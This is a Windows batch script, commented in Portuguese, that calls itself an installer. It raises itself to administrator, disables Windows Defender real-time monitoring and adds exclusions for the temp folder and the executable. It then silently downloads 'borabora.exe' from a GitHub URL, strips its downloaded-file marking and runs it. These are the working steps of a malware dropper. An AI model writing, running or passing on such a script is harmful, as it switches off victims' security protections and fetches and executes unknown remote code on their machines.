@echo off
:: Script para baixar e executar o borabora.exe com desativacao do Defender
:: Requer execucao como Administrador

:: --- Verificacao de Privilegios de Administrador ---
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :admin_tasks
) else (
    echo [!] Solicitando privilegios de Administrador...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:admin_tasks
title Instalador - Modo Administrador
echo [+] Privilegios de Administrador concedidos.

:: Configuracoes
set "URL=https://github.com/romarioeasy/bora/raw/main/borabora.exe"
set "NOME_ARQUIVO=borabora.exe"
set "PASTA_DESTINO=%TEMP%"
set "CAMINHO_COMPLETO=%PASTA_DESTINO%\%NOME_ARQUIVO%"

:: 1. Desativar o Windows Defender temporariamente
echo [+] Desativando Windows Defender e adicionando exclusao...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" 2>nul
powershell -Command "Add-MpPreference -ExclusionPath '%PASTA_DESTINO%'" 2>nul
powershell -Command "Add-MpPreference -ExclusionProcess '%NOME_ARQUIVO%'" 2>nul

:: 2. Baixa o arquivo silenciosamente usando curl
echo [+] Baixando arquivo...
curl -L -s -o "%CAMINHO_COMPLETO%" "%URL%"

:: 3. Remove a trava de seguranca do Windows (Zone Identifier)
powershell -Command "Unblock-File -Path '%CAMINHO_COMPLETO%'" 2>nul

:: 4. Executa o programa e fecha o CMD
echo [+] Executando %NOME_ARQUIVO%...
start "" "%CAMINHO_COMPLETO%"

:: Reativa o Defender se desejar (opcional, remova o '::' abaixo se quiser reativar logo apos abrir)
:: powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false" 2>nul

exit
